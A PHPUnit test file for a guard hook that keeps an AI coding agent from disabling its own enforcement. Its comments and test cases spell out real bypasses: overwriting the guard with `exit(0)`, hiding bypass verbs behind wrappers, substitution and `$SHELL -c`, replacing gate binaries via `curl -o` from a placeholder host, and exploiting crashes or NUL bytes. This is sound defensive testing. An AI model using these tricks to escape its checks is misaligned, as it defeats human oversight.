<?php

declare(strict_types=1);

namespace Droost\Workflow\Tests\Pack;

use Droost\Workflow\Tests\WorkflowTestCase;

/**
 * The shell is an editor, and every way it spells a write reaches enforcement.
 *
 * A shell command can reach the guard's own file, the run record, the evidence
 * store and the gate binaries, and the only thing standing in front of them is
 * a parse of a command line that the shell will interpret differently. That
 * parse has been wrong in sixteen separate ways, each found by a reviewer
 * driving the real hook rather than reading it, and each one ended with the
 * guard overwritten or the wall disarmed:
 *
 *   * a WRAPPER hid the verb — `builtin cd`, `command cd`, `eval cd` moved the
 *     real shell while the tracked directory stayed at the project root, and
 *     `nice rm -rf` / `timeout 5 mv` walked past the destructive-verb test;
 *   * a GLOB named no file — `rm .claude/hooks/*` matched no protected path
 *     because the shell expands the wildcard AFTER the guard has answered;
 *   * a READ VERB wrote — `git diff --output=<path>` truncates its target, and
 *     `&&` binding tighter than `||` left git's read list answering alone;
 *   * a FETCHER wrote — `curl -o vendor/bin/phpcs` replaced a gate's verdict;
 *   * a SUBSTITUTION split the verb — `drush $(echo droost:workflow:byp)ass`;
 *   * PHP spelled the same config write — `drush php:eval` arming a write gate
 *     without ever naming `droost:gate`;
 *   * a DOTTED KEY did too — `drush cset droost.settings.allow_entity_write`;
 *   * a NUL BYTE crashed the guard, and a crash reads as permission.
 *
 * Each case below is one of those, driven through the real hook. They are here
 * together because they are one defect wearing eight costumes: the guard reads
 * a different command from the one that runs.
 */
final class ShellSurfaceTest extends WorkflowTestCase {

  /**
   * A project root with a run under way and the files worth attacking.
   *
   * @return string
   *   The root path.
   */
  private function lab(): string {
    $root = $this->makeRoot();
    mkdir($root . '/.claude/hooks', 0755, TRUE);
    mkdir($root . '/droost/droost-workflow', 0755, TRUE);
    mkdir($root . '/vendor/bin', 0755, TRUE);
    mkdir($root . '/modules/custom/acme', 0755, TRUE);
    file_put_contents($root . '/.claude/settings.json', '{}');
    file_put_contents($root . '/.claude/hooks/droost-workflow-guard.php', '<?php');
    file_put_contents($root . '/vendor/bin/phpcs', '#!/bin/sh');
    file_put_contents($root . '/droost/droost-workflow/run.json', (string) json_encode([
      'current_phase' => 'code',
      'phases' => ['code' => 'active'],
      'enforcement' => 'hard',
    ]));

    return $root;
  }

  /**
   * Runs one shell command through the guard's operator-command mode.
   *
   * @param string $root
   *   The project root.
   * @param string $command
   *   The command line.
   *
   * @return array{0: int, 1: string, 2: string}
   *   Exit code, stdout, stderr.
   */
  private function shell(string $root, string $command): array {
    return $this->guard($root, 'operator-commands', [
      'tool_name' => 'Bash',
      'tool_input' => ['command' => $command],
    ]);
  }

  /**
   * A wrapper in front of the verb does not hide it.
   *
   * The worst of the sixteen, proven end to end by the reviewer who found it:
   * `builtin cd .claude/hooks && echo "<?php exit(0);" > guard.php` was
   * ALLOWED, the guard file was overwritten with a script that permits
   * everything, and the next `stop` went from exit 2 to exit 0. One command
   * took the whole pipeline down.
   */
  public function testWrappersDoNotHideTheVerb(): void {
    $root = $this->lab();
    $cases = [
      'builtin cd' => 'builtin cd .claude/hooks && echo "<?php exit(0);" > droost-workflow-guard.php',
      'command cd' => 'command cd .claude && echo "{}" > settings.json',
      'eval cd' => 'eval cd .claude/hooks && rm droost-workflow-guard.php',
      'nice rm' => 'nice rm -rf droost/droost-workflow',
      'timeout mv' => 'timeout 5 mv droost/droost-workflow /tmp/dw',
      'sudo nice cd' => 'sudo nice cd .claude/hooks && echo x > droost-workflow-guard.php',
      // A WRAPPER IN FRONT OF A RUNNER, which is a different tier from a
      // wrapper in front of `cd` — and the tier that stayed open. There were
      // two wrapper lists: the one the path tier strips had `builtin`,
      // `chronic` and `ts`, and the one that decides whether a quoted argument
      // is re-scanned as a command line did not. So `builtin eval "…"` left
      // the payload as one opaque token that no verb matcher and no path
      // matcher could see, while the identical command without those two words
      // was refused. `builtin eval` is real in both bash and zsh.
      //
      // The cases above are all `cd`; every one of them passed while this was
      // wide open. A rule stated twice is a rule that will eventually be true
      // once, so the list is now one function — and these pin the words that
      // had drifted.
      'builtin eval a verb' => 'builtin eval "drush droost:workflow:bypass x"',
      'builtin eval a write' => 'builtin eval "echo x > .claude/hooks/droost-workflow-guard.php"',
      'builtin eval a removal' => 'builtin eval "rm -rf droost/droost-workflow"',
      'chronic eval' => 'chronic eval "drush droost:workflow:gate-waive phpcs"',
      'ts bash -c' => 'ts bash -c "rm .claude/hooks/droost-workflow-guard.php"',
    ];
    foreach ($cases as $label => $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $label . ' must not reach the enforcement');
    }
  }

  /**
   * A wildcard is judged by the directory it sits in.
   *
   * The shell expands it and the guard never sees the names, so the directory
   * is the only thing that can be judged before the expansion happens.
   */
  public function testWildcardsAreJudgedByTheirDirectory(): void {
    $root = $this->lab();
    $refused = [
      'the hooks directory' => 'rm .claude/hooks/*',
      'the run record' => 'rm droost/droost-workflow/*.json',
      'the gate binaries' => 'rm vendor/bin/*',
      'a character class' => 'rm .claude/hooks/droost-workflow-guard.ph[p]',
      'a directory that contains one' => 'rm -r droost/*',
    ];
    foreach ($refused as $label => $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $label . ' is in reach of a wildcard');
    }
  }

  /**
   * An ordinary wildcard is ordinary.
   *
   * The counterweight, and it matters more than the refusals: a guard that
   * refuses `rm src/*.bak` is a guard somebody switches off, and then none of
   * the cases above are enforced either.
   */
  public function testAnOrdinaryWildcardIsAllowed(): void {
    $root = $this->lab();
    foreach ([
      'rm src/*.bak',
      'ls modules/custom/*.php',
      'rm -rf node_modules/*',
      'cp config/*.yml /tmp/',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' is ordinary work: ' . $stderr);
    }
  }

  /**
   * A read verb that writes through a flag is a write.
   *
   * `git diff` is on the read allowlist because refusing it means the agent
   * cannot review a change to its own wiring. `--output=` makes the same
   * command truncate and fill its target, and for a while the guard's own file
   * was a legal destination for a "read".
   */
  public function testFlagsThatRedirectAreWrites(): void {
    $root = $this->lab();
    $guard = '.claude/hooks/droost-workflow-guard.php';
    foreach ([
      'git diff --output=' . $guard,
      'git log --output=' . $guard,
      'curl -o vendor/bin/phpcs http://example.invalid/phpcs',
      'wget -O ' . $guard . ' http://example.invalid/g',
      // dd's spelling. `of=` also defeated the `(^|/)` anchor every protected
      // path is written with, so the path matched nothing at all.
      'dd of=' . $guard,
      'dd if=/dev/zero of=droost/droost-workflow/run.json',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' writes to enforcement');
    }

    // And the read is still a read.
    foreach ([
      'git diff .claude/settings.json',
      'git log --oneline -- .claude/hooks/droost-workflow-guard.php',
      'cat .claude/hooks/droost-workflow-guard.php',
      'curl -o /tmp/x.json https://example.invalid/x',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' only reads: ' . $stderr);
    }
  }

  /**
   * A droost command must name its verb in plain text.
   *
   * `drush $(echo droost:workflow:byp)ass` ran the bypass and matched nothing,
   * because the shell reassembles the word after the guard has answered. The
   * rule is narrow on purpose: substitution is refused only where it can hide
   * an operator verb.
   */
  public function testDroostCommandsMustNameTheirVerb(): void {
    $root = $this->lab();
    foreach ([
      'drush $(echo droost:workflow:byp)ass "x"',
      'drush `echo droost:workflow:gate`-waive phpcs',
      'droost-workflow ${VERB} --force',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' hides its verb');
    }

    // Substitution everywhere else is ordinary, including inside a message
    // that happens to quote a droost command — which is exactly what the
    // guard's own refusal text tells an agent to show the operator.
    foreach ([
      'cd $(git rev-parse --show-toplevel) && ls',
      'git commit -m "ran drush droost:workflow:bypass on $(date)"',
      'echo "ask the operator: drush droost:workflow:gate-waive phpcs" > /tmp/note',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' is ordinary: ' . $stderr);
    }
  }

  /**
   * Arming a write gate is the operator's act in every spelling.
   *
   * Three of them reach the same config object, and only the first was
   * matched: the drush verb, the dotted config key, and PHP.
   */
  public function testEverySpellingOfArmingWriteGatesIsRefused(): void {
    $root = $this->lab();
    foreach ([
      'the drush verb' => 'drush droost:gate allow_entity_write on',
      'config:set' => 'drush cset droost.settings allow_entity_write true',
      'a dotted key' => 'drush cset droost.settings.allow_entity_write true',
      'php:eval' => 'drush php:eval "\\Drupal::configFactory()'
      . "->getEditable('droost.settings')->set('allow_entity_write', TRUE)->save();\"",
    ] as $label => $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $label . ' arms a write gate');
      $this->assertStringContainsString('OPERATOR', $stderr, $label . ' says whose decision it is');
    }

    // Disarming is a tightening, and reading is a question. Both are the
    // agent's to do — asking for a gate rather than arming it is the whole
    // behaviour this rule exists to produce.
    foreach ([
      'drush droost:gate allow_entity_write off',
      'drush php:eval "print \\Drupal::config(\'droost.settings\')->get(\'allow_entity_write\');"',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' is not arming: ' . $stderr);
    }
  }

  /**
   * A command whose PROGRAM NAME is a variable is refused, not read past.
   *
   * The master key of round five, and it needed no pre-step. `$runs` asked
   * whether the head literally spelled an interpreter, so `$SHELL -c "…"` was
   * not a runner, its quoted argument was dropped as prose, and BOTH walls went
   * blind at once — the operator's bypass ran, and this file was overwritten
   * with the word PWNED, under a verdict of ALLOW.
   *
   * The guard has no shell and no environment, so it cannot expand a variable.
   * That is the reason to refuse rather than a reason to permit.
   */
  public function testProgramNamesTheGuardCannotReadAreRefused(): void {
    $root = $this->lab();
    foreach ([
      '$SHELL -c "drush droost:workflow:bypass x"',
      '"$SHELL" -c "drush droost:workflow:bypass x"',
      'exec $SHELL -c "echo X > .claude/hooks/droost-workflow-guard.php"',
      'S=/bin/sh; $S -c "drush droost:workflow:bypass x"',
      'C="drush droost:workflow:bypass x"; $C',
      '${RUNNER} -c "rm droost/droost-workflow/run.json"',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' cannot be read, so it cannot be allowed');
    }

    // A variable in an ARGUMENT is ordinary and stays ordinary. This is the
    // half that decides whether the rule above survives contact with a real
    // repository.
    foreach ([
      'cp "$f" /tmp/',
      'cd "$ROOT" && ls',
      'git commit -m "$MSG"',
      'grep -r "$PATTERN" src/',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' names its program: ' . $stderr);
    }
  }

  /**
   * A command hidden in a script file or behind a pipe is still read.
   *
   * `bash script.sh` put the verb in a file and the guard judged the two words
   * in front of it. `echo "drush …bypass" | sh` put it in a quoted argument to
   * `echo`, which is not a runner — the unquoted spelling was already caught,
   * and the quoted one ran.
   *
   * Both are readable here: the script is a file on disk inside the project,
   * and a pipeline ending in an interpreter is a program.
   */
  public function testCommandsInScriptsAndPipesAreRead(): void {
    $root = $this->lab();
    file_put_contents($root . '/evil.sh', "#!/bin/sh\ndrush droost:workflow:bypass x\n");
    file_put_contents($root . '/wipe.sh', "#!/bin/sh\nrm .claude/hooks/droost-workflow-guard.php\n");
    file_put_contents($root . '/build.sh', "#!/bin/sh\ncomposer install\nvendor/bin/phpunit\n");

    foreach ([
      'bash evil.sh',
      'sh wipe.sh',
      'echo "drush droost:workflow:bypass x" | sh',
      'printf %s "drush droost:workflow:bypass x" | bash',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' carries a verb the guard can read');
    }

    // An honest script is honest, and a tool's own source is never read as a
    // shell script — reading PHP that way invents refusals out of strings.
    foreach (['bash build.sh', 'php vendor/bin/phpunit'] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' is ordinary work: ' . $stderr);
    }
  }

  /**
   * A wildcard is expanded the way the shell will expand it.
   *
   * Judging the pattern instead of the filesystem left two holes that both
   * deleted their targets: `?` was dropped from the metacharacter set (to stop
   * `<?php` matching), so `…guard.ph?` passed; and only the BASENAME was
   * inspected, so `dro[o]st/droost-workflow/run.json` passed.
   *
   * `glob()` reads the same patterns off the same disk the shell is about to.
   * What the shell will do is knowable here, and guessing at it was the
   * mistake.
   */
  public function testWildcardsAreExpandedNotGuessed(): void {
    $root = $this->lab();
    foreach ([
      'rm .claude/hooks/droost-workflow-guard.ph?',
      'rm dro[o]st/droost-workflow/run.json',
      'rm v[e]ndor/bin/phpcs',
      'rm .claude/hooks/*guard*',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' expands onto enforcement');
    }
  }

  /**
   * Find with an action flag is judged by its own filter.
   *
   * Find reads until it is told to act and then acts on everything it matched,
   * and it was on neither wall: `find . -name droost-workflow-guard.php
   * -delete` deleted the guard, `find .claude -type f -delete` wiped the
   * directory.
   *
   * Judging it by its starting directory alone refused `find . -name "*.tmp"
   * -delete`, which is cleanup somebody does every week — so the filter find
   * states is evaluated with the same matcher find uses.
   */
  public function testFindIsJudgedByItsOwnFilter(): void {
    $root = $this->lab();
    foreach ([
      'find . -name droost-workflow-guard.php -delete',
      'find .claude -type f -delete',
      'find . -name "*.php" -delete',
      'find . -name run.json -exec rm {} +',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' can reach enforcement');
    }
    foreach ([
      'find . -name "*.tmp" -delete',
      'find . -name "*.bak" -delete',
      'find src -name "*.php" -exec grep -l Money {} +',
      'find . -name "*.php" | xargs grep -l Money',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' cannot: ' . $stderr);
    }
  }

  /**
   * The write gates are guarded where they actually live.
   *
   * `Drupal\droost\GateState` reads the seven `allow_*` switches out of
   * `$settings['droost']` in a dedicated `settings.droost.php` — deliberately
   * outside config, so a `config:export`/`config:import` cannot arm them on
   * another site. The guard was matching `droost.settings` CONFIG, which
   * GateState never reads: it refused a command that does nothing and permitted
   * the file that arms every destructive gate droost has.
   */
  public function testTheWriteGatesAreGuardedWhereTheyLive(): void {
    $root = $this->lab();
    mkdir($root . '/web/sites/default', 0755, TRUE);
    file_put_contents($root . '/web/sites/default/settings.php', '<?php');

    [$write] = $this->guard($root, 'pre-tool-use', [
      'tool_name' => 'Write',
      'tool_input' => ['file_path' => $root . '/web/sites/default/settings.droost.php'],
    ]);
    $this->assertSame(2, $write, 'the file that arms the gates is not the agent\'s to write');

    foreach ([
      'echo "<?php \$settings[\'droost\'][\'allow_entity_write\']=TRUE;" > web/sites/default/settings.droost.php',
      'echo "\$settings[\'droost\'][\'allow_destructive\']=TRUE;" >> web/sites/default/settings.php',
    ] as $command) {
      [$exit] = $this->shell($root, $command);
      $this->assertSame(2, $exit, $command . ' arms a write gate');
    }
  }

  /**
   * A NUL byte is refused rather than interpreted.
   *
   * It crashed the guard: `preg_match()` throws a ValueError on a NUL in PHP 8,
   * nothing caught it, and the hook exited 255 — which is neither a block nor
   * an allow, and which every host resolves in the agent's favour. The byte is
   * also the classic way to make a guard read one name while the system acts on
   * another.
   */
  public function testNulBytesAreRefusedNotCrashedOn(): void {
    $root = $this->lab();
    [$exit, , $stderr] = $this->guard($root, 'pre-tool-use', [
      'tool_name' => 'Write',
      'tool_input' => ['file_path' => "a\0b"],
    ]);
    $this->assertSame(2, $exit, 'a NUL byte is refused');
    $this->assertStringContainsString('NUL', $stderr);

    // Nested, because the scan walks the decoded payload rather than the raw
    // text: a host sends the byte as the six characters of a \u0000 escape.
    [$nested] = $this->guard($root, 'operator-commands', [
      'tool_name' => 'Bash',
      'tool_input' => ['command' => "ls", 'extra' => ['deep' => ["x\0y"]]],
    ]);
    $this->assertSame(2, $nested, 'a NUL anywhere in the payload is refused');
  }

  /**
   * A crash lands on a refusal, never on permission.
   *
   * The floor under every other case here. The hook is run by a host that reads
   * its exit code, and the whole file is one uncaught Throwable away from
   * exiting 255 and being read as "not a block" — which has already happened
   * twice in this project's history, once for an hour with a probe reporting
   * that enforcement was working.
   *
   * Proven by breaking a COPY of the guard on purpose, because the property
   * being tested is what happens when the code is wrong.
   */
  public function testCrashesLandOnRefusal(): void {
    $root = $this->lab();
    $source = (string) file_get_contents(
      dirname(__DIR__, 2) . '/pack/hooks/droost-workflow-guard.php',
    );
    $marker = '$stdin = (string) stream_get_contents(STDIN);';
    $this->assertStringContainsString($marker, $source, 'the guard still reads stdin here');
    $broken = $root . '/broken-guard.php';
    file_put_contents($broken, str_replace(
      $marker,
      $marker . "\nthis_function_does_not_exist();",
      $source,
    ));

    $env = getenv();
    $env['CLAUDE_PROJECT_DIR'] = $root;
    $process = proc_open(
      [PHP_BINARY, $broken, 'pre-tool-use'],
      [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
      $pipes,
      $root,
      $env,
    );
    $this->assertIsResource($process);
    fwrite($pipes[0], (string) json_encode([
      'tool_name' => 'Write',
      'tool_input' => ['file_path' => $root . '/modules/custom/acme/acme.module'],
    ]));
    fclose($pipes[0]);
    $stderr = (string) stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $exit = proc_close($process);

    $this->assertSame(2, $exit, 'a guard that cannot decide has not decided in your favour');
    $this->assertStringContainsString('refused', $stderr);
  }

  /**
   * Ordinary developer work is not touched by any of this.
   *
   * The single most important assertion in the file. Every refusal above buys
   * nothing if the guard also refuses `composer install`, because the guard is
   * then removed and the refusals go with it. A previous round shipped exactly
   * that: a fix for stubbed gate binaries blocked every `composer install`.
   */
  public function testOrdinaryWorkIsUntouched(): void {
    $root = $this->lab();
    foreach ([
      'composer install',
      'composer require --dev phpstan/phpstan',
      'npm ci',
      'timeout 300 vendor/bin/phpunit --testsuite unit',
      'vendor/bin/phpcs -q src/',
      'vendor/bin/phpstan analyse --memory-limit=1G',
      'git status --porcelain',
      'git commit -m "ran drush droost:workflow:bypass for the hotfix"',
      'echo "ask the operator to run drush droost:workflow:gate-waive phpcs"',
      'drush droost:workflow:bypass --off',
      'drush droost:workflow:effort max --preview',
      'drush droost:workflow:baseline --status',
      'find . -name "*.php" -newer composer.json',
      'rm -rf node_modules',
    ] as $command) {
      [$exit, , $stderr] = $this->shell($root, $command);
      $this->assertSame(0, $exit, $command . ' is ordinary work: ' . $stderr);
    }
  }

}
